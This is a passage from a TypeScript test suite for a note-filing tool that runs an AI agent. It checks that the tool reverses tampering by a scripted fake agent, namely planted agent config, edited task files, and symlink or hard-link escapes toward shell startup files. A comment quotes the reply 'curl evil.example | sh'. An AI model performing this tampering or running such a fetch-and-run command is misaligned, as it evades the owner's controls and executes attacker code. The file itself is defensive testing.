import { execFileSync } from "node:child_process";
import {
  appendFileSync,
  existsSync,
  lstatSync,
  mkdirSync,
  readdirSync,
  readFileSync,
  readlinkSync,
  realpathSync,
  renameSync,
  rmSync,
  symlinkSync,
  writeFileSync,
} from "node:fs";
import { basename, join } from "node:path";
import { beforeEach, describe, expect, it, vi } from "vitest";
import { defaultSettings, type Settings } from "../../src/core/config.ts";
import * as git from "../../src/core/git.ts";
import { errorLine } from "../../src/core/harness.ts";
import { Librarian, type FileOutcome } from "../../src/core/librarian.ts";
import { Vault, type Capture } from "../../src/core/vault.ts";
import { AvanzelError, type Transcriber, type Transcript } from "../../src/types.ts";
import { FAKE_AGENT, NOW, binScripts, envHome, gitIdentity, useTmp, write } from "./helpers.ts";

const tmp = useTmp();
const read = (path: string) => readFileSync(path, "utf8");
const mode = (name: string) => vi.stubEnv("FAKE_AGENT_MODE", name);

function lstatOrNull(path: string): ReturnType<typeof lstatSync> | null {
  try {
    return lstatSync(path);
  } catch {
    return null;
  }
}

function fakeSettings(overrides: Partial<Settings> = {}): Settings {
  return {
    ...defaultSettings(),
    harness: "fake",
    timeoutSeconds: 30,
    harnesses: { fake: { name: "fake", headless: [process.execPath, FAKE_AGENT, "{prompt}"], interactive: [] } },
    ...overrides,
  };
}

class FakeTranscriber implements Transcriber {
  readonly engine = "fake:asr";
  readonly heard: string[] = [];
  readonly #text: string;

  constructor(text: string) {
    this.#text = text;
  }

  async transcribe(audio: string | Float32Array): Promise<Transcript> {
    this.heard.push(typeof audio === "string" ? basename(audio) : "<samples>");
    return { text: this.#text, engine: this.engine, seconds: 1.5 };
  }
}

async function only(pending: Promise<FileOutcome[]>): Promise<FileOutcome> {
  const outcomes = await pending;
  expect(outcomes).toHaveLength(1);
  return outcomes[0] as FileOutcome;
}

/** Everything the fake agent was run with (FAKE_AGENT_RECORD), oldest first. */
function recordRuns(): () => Array<{ argv: string[]; images: string[]; prompt: string }> {
  const record = join(tmp(), "runs.jsonl");
  vi.stubEnv("FAKE_AGENT_RECORD", record);
  return () => (existsSync(record) ? read(record).trim().split("\n").map((line) => JSON.parse(line)) : []);
}

function filesNamed(folder: string, name: string): string[] {
  return readdirSync(folder, { recursive: true, encoding: "utf8" })
    .filter((rel) => basename(rel) === name)
    .map((rel) => join(folder, rel));
}

let vault: Vault;
let librarian: Librarian;

beforeEach(async () => {
  vault = await Vault.init(join(tmp(), "lib"), { git: false });
  librarian = new Librarian(vault, fakeSettings(), { clock: () => NOW });
});

describe("file", () => {
  it("creates a page, archives the capture and logs it", async () => {
    const capture = librarian.captureText("Build a tiny greenhouse");
    const original = read(capture.path);
    const outcome = await only(librarian.file());
    expect(outcome).toMatchObject({
      ok: true,
      captureId: capture.id,
      message: `Filed into [[idea-${capture.id}]].`,
      error: "",
      restored: false,
      guarded: [],
      commit: null,
    });
    expect(outcome.changes.created).toEqual([`ideas/idea-${capture.id}.md`]);
    expect(outcome.changes.modified).toEqual(["index.md", "log.md"]);
    expect(outcome.archivedTo).toBe(join(vault.root, "raw", "2026", "10", `${capture.id}.md`));
    expect(read(outcome.archivedTo ?? "")).toBe(original);
    expect(vault.pending()).toEqual([]);
    expect(read(vault.logPath).split(`[[${capture.id}]]`)).toHaveLength(2);
  });

  it("keeps the capture in the inbox when the agent fails", async () => {
    mode("fail");
    const capture = librarian.captureText("Something to keep");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(false);
    expect(outcome.error).toContain("not logged in");
    expect(outcome.archivedTo).toBeNull();
    expect(outcome.commit).toBeNull();
    expect(vault.pending()).toEqual([capture.path]);
    expect(vault.logMentions(capture.id)).toBe(false);
  });

  it("restores the owner's words when the agent edits the capture", async () => {
    mode("tamper");
    const capture = librarian.captureText("Original words");
    const original = read(capture.path);
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(outcome.restored).toBe(true);
    expect(read(outcome.archivedTo ?? "")).toBe(original);
  });

  it("adds the log line the agent forgot", async () => {
    mode("nolog");
    const capture = librarian.captureText("Learn Rust");
    await librarian.file();
    expect(read(vault.logPath)).toContain(`- 2026-10-20 14:03 | file | [[${capture.id}]] → [[idea-${capture.id}]]\n`);
  });

  it("accepts an agent that archived the capture itself", async () => {
    mode("move");
    const capture = librarian.captureText("Plant tulips");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(outcome.restored).toBe(false);
    expect(filesNamed(vault.raw, `${capture.id}.md`)).toEqual([outcome.archivedTo]);
  });

  it("never lets a reused inbox name overwrite a filed capture", async () => {
    const note = join(vault.inbox, "note.txt");
    writeFileSync(note, "first words");
    const first = await only(librarian.file());
    writeFileSync(note, "second words");
    const second = await only(librarian.file());
    expect(first.ok && second.ok).toBe(true);
    const archived = readdirSync(vault.raw, { recursive: true, encoding: "utf8" })
      .filter((rel) => rel.endsWith(".md"))
      .map((rel) => read(join(vault.raw, rel)));
    expect(archived.filter((text) => text.includes("first words"))).toHaveLength(1);
    expect(archived.filter((text) => text.includes("second words"))).toHaveLength(1);
  });

  it("never touches an archived capture with the same name", async () => {
    mode("tamper");
    const capture = librarian.captureText("new words");
    const older = write(vault.root, `raw/2026/10/${capture.id}.md`, "older words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(read(older)).toBe("older words");
    expect(read(outcome.archivedTo ?? "")).toContain("new words");
  });

  it("does not count a run that changed nothing as filed", async () => {
    mode("noop");
    const capture = librarian.captureText("Something the agent ignores");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(false);
    expect(outcome.error).toContain("I would need permission to write files.");
    expect(vault.pending()).toEqual([capture.path]);
    expect(vault.logMentions(capture.id)).toBe(false);
  });

  it("lets the agent decide nothing needs filing, when it says so in the log", async () => {
    mode("logonly");
    const capture = librarian.captureText("test test one two");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(vault.pending()).toEqual([]);
    expect(vault.logMentions(capture.id)).toBe(true);
  });

  it("undoes configuration an agent plants for later runs", async () => {
    mode("arm");
    const config = read(join(vault.metaDir, "config.toml"));
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(read(join(vault.metaDir, "config.toml"))).toBe(config);
    expect(existsSync(join(vault.root, ".claude"))).toBe(false);
    expect(existsSync(join(vault.root, ".mcp.json"))).toBe(false);
    expect(outcome.guarded).toEqual([".avanzel/config.toml", ".claude/settings.json", ".mcp.json"]);
  });

  it("undoes changes an agent makes to the shadow tasks", async () => {
    mode("plant-task");
    const evening = read(join(vault.root, "tasks", "evening-review.md"));
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(read(join(vault.root, "tasks", "evening-review.md"))).toBe(evening);
    expect(existsSync(join(vault.root, "tasks", "planted.md"))).toBe(false);
    expect(outcome.guarded).toEqual(["tasks/evening-review.md", "tasks/planted.md"]);
    expect(outcome.changes.created).toEqual([`ideas/idea-${outcome.captureId}.md`]);
  });

  it("never writes through a symlink an agent put in place of a protected folder", async () => {
    mode("link-tasks");
    const outside = join(tmp(), "outside");
    mkdirSync(outside);
    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
    const tasks = Object.fromEntries(
      ["evening-review.md", "weekly-review.md"].map((name) => [name, read(join(vault.root, "tasks", name))]),
    );
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(readdirSync(outside)).toEqual([]);
    expect(lstatSync(join(vault.root, "tasks")).isDirectory()).toBe(true);
    for (const [name, text] of Object.entries(tasks)) expect(read(join(vault.root, "tasks", name))).toBe(text);
    expect(outcome.guarded).toEqual(["tasks", "tasks/evening-review.md", "tasks/weekly-review.md"]);
  });

  it("removes a settings file an agent links into a protected folder from elsewhere", async () => {
    mode("link-settings");
    write(vault.root, ".claude/settings.local.json", '{"permissions": {}}'); // left by interactive sessions
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(lstatOrNull(join(vault.root, ".claude", "settings.json"))).toBeNull();
    expect(read(join(vault.root, ".claude", "settings.local.json"))).toBe('{"permissions": {}}');
    expect(outcome.guarded).toEqual([".claude/settings.json"]);
  });

  it("never writes or deletes outside the library through a protected folder swapped for a symlink", async () => {
    mode("link-commands");
    const outside = join(tmp(), "outside");
    write(outside, "tidy.md", "the outside folder's own file");
    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
    write(vault.root, ".claude/commands/tidy.md", "Tidy the inbox.");
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(readdirSync(outside)).toEqual(["tidy.md"]);
    expect(read(join(outside, "tidy.md"))).toBe("the outside folder's own file");
    expect(lstatSync(join(vault.root, ".claude", "commands")).isDirectory()).toBe(true); // the planted link is gone
    expect(read(join(vault.root, ".claude", "commands", "tidy.md"))).toBe("Tidy the inbox.");
    expect(outcome.guarded).toEqual([".claude/commands", ".claude/commands/tidy.md"]);
  });

  it("puts back the folder that holds the settings when an agent swaps it for a symlink", async () => {
    mode("link-meta");
    const outside = join(tmp(), "outside");
    write(outside, "config.toml", 'harness = "evil"\n');
    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
    const config = read(join(vault.metaDir, "config.toml"));
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(readdirSync(outside)).toEqual(["config.toml"]);
    expect(read(join(outside, "config.toml"))).toBe('harness = "evil"\n');
    expect(lstatSync(vault.metaDir).isDirectory()).toBe(true);
    expect(read(join(vault.metaDir, "config.toml"))).toBe(config);
    expect(outcome.guarded).toEqual([".avanzel", ".avanzel/config.toml"]);
  });

  it("never writes its log line through a symlink an agent put at log.md", async () => {
    mode("link-log");
    const outside = write(tmp(), "outside/.zshrc", "export PATH=/usr/bin\n");
    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
    const capture = librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(read(outside)).toBe("export PATH=/usr/bin\n");
    expect(lstatSync(vault.logPath).isFile()).toBe(true);
    expect(read(vault.logPath)).toContain(`| file | [[${capture.id}]] → [[idea-${capture.id}]]\n`);
    expect(outcome.guarded).toEqual(["log.md"]);
  });

  it("puts back a protected file an agent turned into a folder", async () => {
    mode("swap");
    vi.stubEnv("FAKE_AGENT_SWAP", "AGENTS.md");
    const rules = read(join(vault.root, "AGENTS.md"));
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(lstatSync(join(vault.root, "AGENTS.md")).isFile()).toBe(true);
    expect(read(join(vault.root, "AGENTS.md"))).toBe(rules);
    expect(outcome.guarded).toEqual(["AGENTS.md", "AGENTS.md/x.md"]);
  });

  it("puts back the settings file an agent turned into a folder", async () => {
    mode("swap");
    vi.stubEnv("FAKE_AGENT_SWAP", ".avanzel/config.toml");
    const config = read(join(vault.metaDir, "config.toml"));
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(read(join(vault.metaDir, "config.toml"))).toBe(config);
    expect(outcome.guarded).toEqual([".avanzel/config.toml", ".avanzel/config.toml/x.md"]);
  });

  it("puts back a protected folder an agent turned into a file", async () => {
    mode("swap");
    vi.stubEnv("FAKE_AGENT_SWAP", ".claude/commands");
    write(vault.root, ".claude/commands/tidy.md", "Tidy the inbox.");
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(lstatSync(join(vault.root, ".claude", "commands")).isDirectory()).toBe(true);
    expect(read(join(vault.root, ".claude", "commands", "tidy.md"))).toBe("Tidy the inbox.");
    expect(outcome.guarded).toEqual([".claude/commands", ".claude/commands/tidy.md"]);
  });

  it("puts back the library's settings folder when an agent turns it into a file", async () => {
    mode("swap");
    vi.stubEnv("FAKE_AGENT_SWAP", ".avanzel");
    const config = read(join(vault.metaDir, "config.toml"));
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(vault.exists()).toBe(true);
    expect(read(join(vault.metaDir, "config.toml"))).toBe(config);
    expect(outcome.guarded).toEqual([".avanzel", ".avanzel/config.toml"]);
  });

  it("never moves or deletes anything outside the library through a link under raw/", async () => {
    mode("link-year"); // also rewrites the capture
    const outside = join(tmp(), "outside");
    const capture = librarian.captureText("harmless words");
    const original = read(capture.path);
    write(outside, `10/${capture.id}.md`, "an outside file of the same name");
    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
    const outcome = await only(librarian.file());
    expect(readdirSync(join(outside, "10"))).toEqual([`${capture.id}.md`]);
    expect(read(join(outside, "10", `${capture.id}.md`))).toBe("an outside file of the same name");
    expect(outcome).toMatchObject({ ok: true, restored: true, guarded: ["raw/2026"] }); // the planted link is gone
    const archived = join(vault.raw, "2026", "10", `${capture.id}.md`);
    expect(outcome.archivedTo).toBe(archived);
    expect(realpathSync(archived)).toBe(archived); // a real raw/2026/10/, inside the library
    expect(read(archived)).toBe(original); // the owner's words
    expect(vault.pending()).toEqual([]);
  });

  it("removes a link an agent planted under raw/audio, so later recordings stay in the library", async () => {
    mode("link-audio");
    const outside = join(tmp(), "outside");
    mkdirSync(outside);
    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.guarded).toContain("raw/audio/2026");
    expect(lstatOrNull(join(vault.raw, "audio", "2026"))?.isSymbolicLink() ?? false).toBe(false);
    expect(realpathSync(vault.newAudioPath(NOW)).startsWith(`${vault.root}/`)).toBe(true);
    expect(readdirSync(outside)).toEqual([]);
  });

  it("removes a link an agent planted under raw/attachments, so later screenshots stay in the library", async () => {
    mode("link-attachments");
    const outside = join(tmp(), "outside");
    mkdirSync(outside);
    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.guarded).toContain("raw/attachments/2026/10");
    expect(lstatOrNull(join(vault.raw, "attachments", "2026", "10"))?.isSymbolicLink() ?? false).toBe(false);
    expect(realpathSync(vault.newAttachmentPath(NOW, ".png")).startsWith(`${vault.root}/`)).toBe(true);
    expect(readdirSync(outside)).toEqual([]);
  });

  it("never changes a file outside the library that an agent hard-linked as log.md", async () => {
    mode("hardlink-log");
    const outside = write(tmp(), "outside/.zshrc", "export PATH=/usr/bin\n");
    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
    const capture = librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(read(outside)).toBe("export PATH=/usr/bin\n");
    expect(lstatSync(vault.logPath).nlink).toBe(1);
    expect(read(vault.logPath)).toContain(`| file | [[${capture.id}]] → [[idea-${capture.id}]]\n`);
  });

  it("leaves the owner's own symlinks among the protected files alone", async () => {
    rmSync(join(vault.root, "CLAUDE.md"));
    symlinkSync("AGENTS.md", join(vault.root, "CLAUDE.md"));
    librarian.captureText("harmless words");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(outcome.guarded).toEqual([]);
    expect(readlinkSync(join(vault.root, "CLAUDE.md"))).toBe("AGENTS.md");
  });

  it("also files what was captured while it ran", async () => {
    mode("spawn");
    const first = librarian.captureText("First thought");
    const outcomes = await librarian.file();
    expect(outcomes.map((outcome) => outcome.captureId)).toEqual([first.id, "2026-10-20-150000-late"]);
    expect(vault.pending()).toEqual([]);
  });

  it("files only the given captures when asked to", async () => {
    const first = librarian.captureText("first");
    const second = librarian.captureText("second");
    expect((await librarian.file([second.path])).map((outcome) => outcome.captureId)).toEqual([second.id]);
    expect(vault.pending()).toEqual([first.path]);
  });

  it("transcribes recordings dropped into the inbox", async () => {
    const transcriber = new FakeTranscriber("call mom about the trip");
    librarian = new Librarian(vault, fakeSettings(), { transcriber, clock: () => NOW });
    const memo = join(vault.inbox, "Voice Memo 12.m4a");
    writeFileSync(memo, "fake audio");
    const outcome = await only(librarian.file());
    expect(transcriber.heard).toEqual(["Voice Memo 12.m4a"]);
    expect(outcome.ok).toBe(true);
    expect(existsSync(memo)).toBe(false);
    expect(read(join(vault.raw, "audio", "2026", "10", "2026-10-20-140312.m4a"))).toBe("fake audio");
    const archived = read(outcome.archivedTo ?? "");
    expect(archived).toContain("source: audio\n");
    expect(archived).toContain("call mom about the trip");
    expect(archived).toContain("![[2026-10-20-140312.m4a]]");
  });

  it("keeps a silent recording and moves on", async () => {
    librarian = new Librarian(vault, fakeSettings(), { transcriber: new FakeTranscriber(""), clock: () => NOW });
    writeFileSync(join(vault.inbox, "silence.wav"), "quiet");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(outcome.archivedTo).toBeNull();
    expect(outcome.message).toContain("No speech");
    expect(vault.pending()).toEqual([]);
    expect(existsSync(join(vault.raw, "audio", "2026", "10", "2026-10-20-140312.wav"))).toBe(true);
  });

  it("leaves a recording in the inbox when there is no speech-to-text engine", async () => {
    const memo = join(vault.inbox, "memo.m4a");
    writeFileSync(memo, "fake audio");
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(false);
    expect(outcome.error).toContain("memo.m4a");
    expect(vault.pending()).toEqual([memo]);
  });

  it("hands the capture's screenshot to the agent and points the prompt at it", async () => {
    const runs = recordRuns();
    const codex = binScripts(tmp(), { codex: `exec '${process.execPath}' '${FAKE_AGENT}' "$@"` });
    vi.stubEnv("PATH", `${codex}:${process.env.PATH ?? ""}`);
    librarian = new Librarian(vault, { ...defaultSettings(), harness: "codex", timeoutSeconds: 30 }, { clock: () => NOW });
    const capture = librarian.captureScreen({ image: write(tmp(), "shot.png", "PNG"), comment: "Look at this" });
    const outcome = await only(librarian.file());
    expect(outcome.ok).toBe(true);
    expect(outcome.message).toBe(`Filed into [[idea-${capture.id}]].`); // from Codex's -o file
    const [run] = runs();
    const screenshot = "raw/attachments/2026/10/2026-10-20-140312.png";
    expect(run?.images).toEqual([screenshot]);
    expect(run?.argv.slice(-4)).toEqual(["-i", screenshot, "--", run?.prompt]);
    expect(run?.prompt).toContain(`This capture has a screenshot: ${screenshot}. Open it to see what the owner was looking at.`);
  });

  it("passes the owner's standing instructions to the agent", async () => {
    const runs = recordRuns();
    librarian.captureText("A thought");
    await librarian.file(null, { instructions: "Merge notes about the same thing." });
    expect(runs()[0]?.prompt).toContain(
      "The owner's standing instructions for this run: Merge notes about the same thing.\n\nWhen done",
    );
  });

  it("stops when cancelled, leaving the rest in the inbox", async () => {
    mode("slow-noisy");
    const first = librarian.captureText("first");
    const second = librarian.captureText("second");
    const controller = new AbortController();
    setTimeout(() => controller.abort(), 500);
    const outcomes = await librarian.file(null, { signal: controller.signal });
    expect(outcomes.map((outcome) => outcome.ok)).toEqual([false]);
    expect(errorLine(outcomes[0]?.error ?? "")).toBe("fake was cancelled");
    expect(vault.pending()).toEqual([first.path, second.path]);
  });
});

describe("failures report the line that matters", () => {
  it("shows the error, not the prompt the agent echoed", async () => {
    mode("fail-noisy");
    librarian.captureText("Will fail");
    const outcome = await only(librarian.file());
    expect(errorLine(outcome.error)).toBe("ERROR: the model is not supported with this account");
  });

  it("surfaces a login prompt", async () => {
    mode("fail-signin");
    const outcome = await librarian.ask("anything?");
    expect(outcome.result.ok).toBe(false);
    const line = errorLine(outcome.result.stderr || outcome.result.output);
    expect(line).toContain("Press any key to sign in");
    expect(line).not.toContain("ttttt");
  });

  it("reports a timeout as a timeout", async () => {
    mode("slow-noisy");
    librarian = new Librarian(vault, fakeSettings({ timeoutSeconds: 1 }), { clock: () => NOW });
    const capture = librarian.captureText("Takes forever");
    const outcome = await only(librarian.file());
    expect(errorLine(outcome.error)).toBe("fake timed out after 1s");
    expect(vault.pending()).toEqual([capture.path]);
  });
});

describe("captureAudio", () => {
  it("copies a recording from outside the library", async () => {
    librarian = new Librarian(vault, fakeSettings(), { transcriber: new FakeTranscriber("hello"), clock: () => NOW });
    const outside = write(tmp(), "note.wav", "audio");
    const capture = await librarian.captureAudio(outside, { source: "audio" });
    expect(existsSync(outside)).toBe(true);
    expect(read(join(vault.raw, "audio", "2026", "10", "2026-10-20-140312.wav"))).toBe("audio");
    expect(capture?.source).toBe("audio");
  });

  it("needs a speech-to-text engine", async () => {
    await expect(librarian.captureAudio(write(tmp(), "note.wav", "audio"), { source: "voice" })).rejects.toThrow(AvanzelError);
  });
});

describe("captureScreen", () => {
  it("copies the screenshot in and records where it came from (capture_screen_writes_attachment_and_context)", () => {
    const shot = write(tmp(), "Screenshot 2026-10-20 at 14.03.12.png", "PNG");
    const capture = librarian.captureScreen({
      image: shot,
      comment: "This pricing table is clever",
      context: { app: "Safari", title: "Pricing — Stripe", url: "https://stripe.com/pricing" },
    });
    expect(capture).toEqual({
      id: "2026-10-20-140312-this-pricing-table-is-clever",
      path: join(vault.inbox, "2026-10-20-140312-this-pricing-table-is-clever.md"),
      source: "screen",
    });
    expect(read(join(vault.raw, "attachments", "2026", "10", "2026-10-20-140312.png"))).toBe("PNG");
    expect(existsSync(shot)).toBe(true);
    expect(read(capture.path)).toBe(
      "---\n" +
        "id: 2026-10-20-140312-this-pricing-table-is-clever\n" +
        "type: capture\n" +
        "source: screen\n" +
        "created: 2026-10-20T14:03:12+04:00\n" +
        "app: Safari\n" +
        "title: Pricing — Stripe\n" +
        "url: https://stripe.com/pricing\n" +
        "attachments: [raw/attachments/2026/10/2026-10-20-140312.png]\n" +
        "---\n" +
        "\n" +
        "This pricing table is clever\n" +
        "\n" +
        "![[2026-10-20-140312.png]]\n",
    );
    expect(vault.pending()).toEqual([capture.path]); // waits for the evening review
  });

  it("keeps a screenshot already in raw/attachments in place and notes the spoken comment", () => {
    const image = vault.newAttachmentPath(NOW, ".png");
    writeFileSync(image, "PNG");
    const audio = vault.newAudioPath(NOW);
    writeFileSync(audio, "RIFF");
    const capture = librarian.captureScreen({
      image,
      comment: "Remember this chart",
      audio,
      transcriber: "onnx-asr:nemo-parakeet-tdt-0.6b-v3",
      context: { app: "Preview" },
    });
    expect(read(capture.path)).toBe(
      "---\n" +
        "id: 2026-10-20-140312-remember-this-chart\n" +
        "type: capture\n" +
        "source: screen\n" +
        "created: 2026-10-20T14:03:12+04:00\n" +
        "app: Preview\n" +
        "attachments: [raw/attachments/2026/10/2026-10-20-140312.png]\n" +
        "audio: raw/audio/2026/10/2026-10-20-140312.wav\n" +
        "transcriber: onnx-asr:nemo-parakeet-tdt-0.6b-v3\n" +
        "---\n" +
        "\n" +
        "Remember this chart\n" +
        "\n" +
        "![[2026-10-20-140312.png]]\n" +
        "\n" +
        "![[2026-10-20-140312.wav]]\n",
    );
    expect(readdirSync(join(vault.raw, "attachments", "2026", "10"))).toEqual(["2026-10-20-140312.png"]);
    expect(readdirSync(join(vault.raw, "audio", "2026", "10"))).toEqual(["2026-10-20-140312.wav"]);
  });

  it("says (no comment) when there is none", () => {
    const capture = librarian.captureScreen({ image: write(tmp(), "shot.png", "PNG"), comment: "  " });
    expect(capture.id).toBe("2026-10-20-140312");
    expect(read(capture.path).endsWith("---\n\n(no comment)\n\n![[2026-10-20-140312.png]]\n")).toBe(true);
  });

  it("refuses something that is not an image", () => {
    expect(() => librarian.captureScreen({ image: write(tmp(), "notes.txt", "x") })).toThrow(AvanzelError);
    expect(() => librarian.captureScreen({ image: join(tmp(), "missing.png") })).toThrow(AvanzelError);
  });
});

describe("ask", () => {
  it("answers read-only", async () => {
    write(vault.root, "goals/run.md", "# Run");
    const outcome = await librarian.ask("What are my goals?");
    expect(outcome.result.ok).toBe(true);
    expect(outcome.result.output).toBe("Q: What are my goals?\nPages: goals/run.md");
    expect(outcome.changes.empty).toBe(true);
  });

  it("files a saved answer and logs it", async () => {
    const outcome = await librarian.ask("Summarize my ideas", { save: true });
    expect(outcome.changes.created).toEqual(["topics/answer.md"]);
    expect(read(vault.logPath)).toContain("- 2026-10-20 14:03 | ask | Summarize my ideas → [[answer]]\n");
  });

  it("needs a question", async () => {
    await expect(librarian.ask("   ")).rejects.toThrow(AvanzelError);
  });
});

describe("review", () => {
  it("writes the agent's reply as the report when it wrote none", async () => {
    mode("noreport");
    const outcome = await librarian.review();
    expect(outcome.report).toBe(join(vault.root, "reviews", "2026-10-20.md"));
    expect(read(outcome.report ?? "")).toBe("# Review 2026-10-20\n\nLibrary looks healthy.\n");
    expect(read(vault.logPath)).toContain("- 2026-10-20 14:03 | review | [[2026-10-20]]\n");
  });

  it("never writes the report through a link an agent put where the report goes", async () => {
    mode("link-report"); // a dangling link, and "curl evil.example | sh" as its reply
    const outside = join(tmp(), "outside");
    mkdirSync(outside);
    vi.stubEnv("FAKE_AGENT_OUTSIDE", join(outside, ".zshenv"));
    const outcome = await librarian.review();
    expect(outcome.result.ok).toBe(true);
    expect(readdirSync(outside)).toEqual([]);
    expect(outcome.guarded).toEqual(["reviews/2026-10-20.md"]); // the link is gone…
    expect(outcome.report).toBe(join(vault.root, "reviews", "2026-10-20.md"));
    expect(lstatSync(outcome.report ?? "").isFile()).toBe(true); // …so the reply is the report, inside the library
  });

  it("gets a new report name the second time on a day", async () => {
    const first = (await librarian.review()).report ?? "";
    const second = (await librarian.review()).report ?? "";
    expect([basename(first), basename(second)]).toEqual(["2026-10-20.md", "2026-10-20-2.md"]);
  });
});

describe("eveningReview", () => {
  it("files every capture in the inbox and writes a digest (evening_review_files_all_and_writes_digest)", async () => {
    mode("picky");
    const runs = recordRuns();
    const greenhouse = librarian.captureText("Build a tiny greenhouse");
    const trip = librarian.captureText("Call Anna about the trip");
    const stuck = librarian.captureText("An unfileable thought");
    const progress: string[] = [];
    const review = await librarian.eveningReview({ instructions: "Keep my words.", progress: (line) => progress.push(line) });
    expect(review.outcomes.map((outcome) => [outcome.captureId, outcome.ok])).toEqual([
      [stuck.id, false],
      [greenhouse.id, true],
      [trip.id, true],
    ]);
    expect(review.digestPath).toBe(join(vault.root, "reviews", "2026-10-20-evening.md"));
    expect(read(review.digestPath ?? "")).toBe(
      [
        "# Evening review 2026-10-20",
        "",
        "Filed 2 of 3 captures.",
        "",
        "## What went where",
        "",
        `- [[${greenhouse.id}]]: Filed into [[idea-${greenhouse.id}]].`,
        `  - New: [[idea-${greenhouse.id}]]`,
        `- [[${trip.id}]]: Filed into [[idea-${trip.id}]].`,
        `  - New: [[idea-${trip.id}]]`,
        "",
        "## Needs attention",
        "",
        `- [[${stuck.id}]]: agent crashed: cannot file this one (still in the inbox)`,
        "",
      ].join("\n"),
    );
    expect(read(vault.logPath)).toContain("- 2026-10-20 14:03 | review | [[2026-10-20-evening]]\n");
    expect(vault.pending()).toEqual([stuck.path]);
    expect(review.commits).toEqual([]); // this library is not versioned
    expect(runs().map((run) => run.prompt)).toHaveLength(3);
    for (const run of runs()) expect(run.prompt).toContain("The owner's standing instructions for this run: Keep my words.");
    expect(progress).toContain(`Filing ${greenhouse.id}.md with fake…`);
  });

  it("notes what the agent tried to change that it may not", async () => {
    mode("tamper");
    const capture = librarian.captureText("Original words");
    const review = await librarian.eveningReview();
    expect(read(review.digestPath ?? "")).toContain(
      `- [[${capture.id}]]: Filed into [[idea-${capture.id}]].\n  - New: [[idea-${capture.id}]]\n` +
        "  - The agent edited your capture; your original words were restored.\n",
    );
  });

  it("notes the links it removed from Avanzel's own folders", async () => {
    mode("link-audio");
    const outside = join(tmp(), "outside");
    mkdirSync(outside);
    vi.stubEnv("FAKE_AGENT_OUTSIDE", outside);
    librarian.captureText("harmless words");
    const review = await librarian.eveningReview();
    expect(read(review.digestPath ?? "")).toContain(
      "  - Undid the agent's changes to raw/audio/2026 " +
        "(library rules, settings and tasks are off-limits to it, and so are links in Avanzel's own folders).\n",
    );
  });

  describe("with a symlinked inbox/, an agent that changes the capture", () => {
    let capture: Capture;
    let kept: string;

    beforeEach(() => {
      mode("tamper"); // files it, then rewrites the capture
      const elsewhere = join(tmp(), "elsewhere");
      renameSync(vault.inbox, elsewhere);
      symlinkSync(elsewhere, vault.inbox);
      capture = librarian.captureText("My exact words");
      kept = `.avanzel/logs/${capture.id}.original.md`;
    });

    it("leaves the owner's words in .avanzel/logs, and the digest says so", async () => {
      const original = read(capture.path);
      const review = await librarian.eveningReview();
      const [outcome] = review.outcomes;
      expect(outcome).toMatchObject({ ok: false, savedOriginal: kept });
      expect(read(join(vault.root, kept))).toBe(original);
      const digest = read(review.digestPath ?? "");
      expect(digest).toContain(`(your words are kept in ${kept})`);
      expect(digest).not.toContain("still in the inbox");
    });

    it("never replaces words an earlier try kept", async () => {
      write(vault.root, kept, "the words of the first try\n");
      const outcome = await only(librarian.file());
      expect(outcome.savedOriginal).toBe(kept);
      expect(read(join(vault.root, kept))).toBe("the words of the first try\n");
    });
  });

  it("writes nothing when the inbox is empty", async () => {
    expect(await librarian.eveningReview()).toEqual({ outcomes: [], digestPath: null, commits: [] });
    expect(readdirSync(join(vault.root, "reviews"))).toEqual([]);
  });

  it("never writes the digest through a link left where it would go", async () => {
    const outside = join(tmp(), "outside");
    mkdirSync(outside);
    symlinkSync(join(outside, ".zshenv"), join(vault.root, "reviews", "2026-10-20-evening.md"));
    librarian.captureText("one");
    const review = await librarian.eveningReview();
    expect(readdirSync(outside)).toEqual([]);
    expect(basename(review.digestPath ?? "")).toBe("2026-10-20-evening-2.md");
  });

  it("numbers a second digest on the same day", async () => {
    librarian.captureText("one");
    await librarian.eveningReview();
    librarian.captureText("two");
    const second = await librarian.eveningReview();
    expect(basename(second.digestPath ?? "")).toBe("2026-10-20-evening-2.md");
    expect(read(second.digestPath ?? "")).toContain("Filed 1 of 1 capture.\n");
  });
});

describe.skipIf(!git.available())("with git", () => {
  let versioned: Vault;

